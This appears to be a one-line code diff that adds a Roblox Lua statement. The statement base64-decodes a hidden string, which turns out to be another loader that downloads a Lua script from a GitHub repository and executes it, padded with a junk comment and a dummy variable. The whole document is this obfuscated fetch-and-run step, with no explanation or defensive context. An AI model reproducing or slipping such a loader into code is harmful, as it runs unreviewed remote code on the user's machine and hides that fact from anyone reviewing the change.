@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('data:text/plain;base64,bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90eXlneXlnNzc4LW1ha2VyL1JvYmxveC1zY3JpcHQvcmVmcy9oZWFkcy9tYWluL2Z1bGxjaHVjbmFuZy5sdWEiKSkoKQotLSBzd2c3eGNtbApsb2NhbCBqazh0ejYgPSAyNw=='))()
